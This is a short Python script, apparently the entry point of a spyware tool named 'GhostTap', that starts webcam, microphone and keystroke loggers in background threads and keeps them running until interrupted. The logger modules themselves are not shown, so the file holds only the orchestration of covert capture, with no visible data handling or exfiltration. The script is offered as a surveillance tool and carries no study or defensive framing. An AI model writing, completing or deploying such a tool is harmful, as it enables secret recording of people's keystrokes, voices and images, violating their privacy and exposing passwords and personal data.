from cam_logger import cam_logger
from mic_logger import mic_logger
from key_logger import key_logger
import threading
import time

threading.Thread(target=cam_logger, daemon=True).start()
threading.Thread(target=mic_logger, daemon=True).start()
threading.Thread(target=key_logger, daemon=True).start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("GhostTap Terminated.")